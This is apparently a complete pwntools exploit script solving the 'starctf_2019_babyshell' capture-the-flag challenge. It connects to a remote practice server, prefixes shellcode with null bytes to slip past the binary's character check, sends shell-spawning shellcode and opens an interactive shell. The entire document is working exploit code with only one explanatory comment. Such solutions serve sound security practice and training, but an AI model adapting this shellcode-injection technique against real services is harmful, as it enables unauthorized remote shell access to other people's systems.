# method one

from pwn import *


# p = process("./starctf_2019_babyshell")
p = remote("node4.buuoj.cn", 26649)

context(os="linux", arch="amd64")

# use "\x00" to bypass the check func
code = b"\x00\x42\x00"+asm(shellcraft.sh())
print(disasm(code))
p.send(code)

p.interactive()


